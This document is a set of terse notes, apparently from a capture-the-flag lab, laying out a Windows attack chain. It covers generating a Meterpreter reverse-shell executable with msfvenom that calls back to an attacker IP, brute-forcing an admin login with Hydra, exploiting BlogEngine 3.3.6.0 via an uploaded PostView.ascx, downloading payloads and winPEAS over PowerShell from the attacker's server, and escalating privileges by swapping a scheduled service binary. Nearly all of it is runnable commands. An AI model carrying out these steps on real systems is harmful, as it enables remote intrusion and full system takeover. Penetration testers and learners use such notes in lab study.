# Basic exploit (metasploit) (100 detectable)

## Generate payload

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe
* get payload to target
* start listener before runing

## Start listener

* msfconsole -> use multi/handler
* set PAYLOAD windows/meterpreter/reverse_tcp
* set LHOST <IP> set LPORT 9001
* wait for connection



# Web IIS expoit

* Enumerate directories with nmap
* Hydra brute force admin
* Exploit blog engine 3.3.6.0 (searchsploit -m <path>)
* Edit as PostView.ascx
* upload (read expoit for instructions)
* Listen on port
* Capture session

### Metasploit Cont Version

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe

* python -m SimpleHTTPServer

* go to c:/Windows/Temp

* powershell -c "Invoke-WebRequest -Uri 'http://10.6.33.220:8000/Hack.exe' -Outfile 'C:\Windows\Temp\Hack.exe'"

* msfconsole -> use multi/handler

* set PAYLOAD windows/meterpreter/reverse_tcp

* set LHOST <IP> set LPORT 9001

* .\Hack.exe -> gain meterpreter

* drop to shell

* powershell -c "Invoke-WebRequest -Uri 'http://10.6.33.220:8000/tools/winPEAS/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
*.\winPEAS.bat

* Check for vuln processes -> Windows Scheduler -> Program Files ( Event log says message is ran every 30 sec)

* move payload into `c:\Program Files (x86)\SystemScheduler>`

* meterpreter -> mv message.exe message.bak
* mv shell.exe message.exe
* bg
* run multi/handler
* Gain shell